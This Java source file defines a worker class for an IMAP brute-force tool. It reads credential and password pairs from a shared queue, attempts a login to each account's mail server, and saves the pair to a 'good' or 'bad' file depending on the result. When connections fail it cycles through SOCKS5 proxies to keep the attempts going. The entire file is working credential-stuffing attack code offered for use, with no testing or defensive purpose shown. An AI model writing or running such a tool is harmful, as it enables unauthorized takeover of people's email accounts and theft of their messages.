package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import com.chilkatsoft.CkString;
import lombok.RequiredArgsConstructor;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.components.LogView;
import org.bsoftware.parcel.domain.model.Connection;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.ConnectionUtility;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.5
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Defines Socks version
     */
    private static final byte SOCKS_VERSION = 5;

    /**
     * Indicator for proxy usage
     */
    private final boolean useProxies;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        if (useProxies)
        {
            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
            ckImap.put_SocksVersion(SOCKS_VERSION);
        }

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                final Connection connection = ConnectionUtility.getConnection(source.getCredential());

                ckImap.put_Port(connection.getPort());
                ckImap.put_Ssl(connection.isSsl());
                ckImap.put_StartTls(connection.isTls());

                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);
                if ((useProxies && isFailedToConnect(ckImap, connection.getHost())) || !ckImap.Connect(connection.getHost()))
                {
                    break;
                }

                FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                ckImap.Disconnect();
            }
        }
        catch (final IOException ioException)
        {
            bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, message: %s", ioException.getMessage()));
        }

        bruteForceCallback.handleThreadInterruption();
    }

    /**
     * Get new proxy until they available
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     * @return true, when cannot connect to IMAP server
     */
    private boolean isFailedToConnect(final CkImap ckImap, final String host)
    {
        final CkString currentProxyHostname = new CkString();

        ckImap.get_SocksHostname(currentProxyHostname);
        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(host))
        {
            return Boolean.FALSE;
        }

        Proxy proxy;
        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());
            bruteForceCallback.handleDecrementCounter(DataType.PROXY);

            if (ckImap.Connect(host))
            {
                return Boolean.FALSE;
            }
        }

        return Boolean.TRUE;
    }
}